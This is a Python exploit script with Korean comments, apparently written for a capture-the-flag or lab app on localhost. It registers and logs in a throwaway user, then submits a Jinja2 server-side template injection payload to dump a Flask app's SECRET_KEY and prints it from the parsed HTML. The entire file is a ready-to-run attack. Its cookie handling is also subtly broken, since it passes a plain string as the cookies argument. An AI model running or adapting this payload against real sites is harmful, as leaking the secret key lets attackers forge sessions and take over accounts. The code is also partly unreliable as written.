import requests
from bs4 import BeautifulSoup
import random

target_url = "http://localhost:4242"

# 첫 번째 응답을 빼오기 위해, random한 유저 생성
random_username = "user" + str(random.randint(1, 100000))
random_password = "pass" + str(random.randint(1, 100000))

register_info = {
    'username': random_username,
    'password': random_password,
}

# 회원가입
register_response = requests.post(target_url + "/register", data=register_info)


# 로그인
session = requests.Session()
login_response = session.post(target_url + "/login", data=register_info)

# 성공적으로 로그인 되었는지 확인
if 'Login failed' not in login_response.text:
    print(login_response.text)
    cookies = session.cookies.get_dict()
    print("Session Cookies:", cookies)
else:
    print("Login failed.")


target_url = "http://localhost:4242/service_post"

# 플라스크의 Jinja2 템플릿 엔진이 app.secret_key를 출력하도록 SSTI 취약점을 이용
exploit_payload = '{{config["SECRET_KEY"]}}'
data = {'content': exploit_payload}

cookies = cookies['session']

response = requests.post(target_url, data=data, cookies=cookies)

data = response.text

soup = BeautifulSoup(data, 'html.parser')

# app.secret_key를 출력하는 부분을 찾아서, app.secret_key를 출력
media_body_in_reverse = soup.find(
    'div', {'class': 'media-chat-reverse'}).find('div', {'class': 'media-body'})

text = media_body_in_reverse.p.text

print(text) 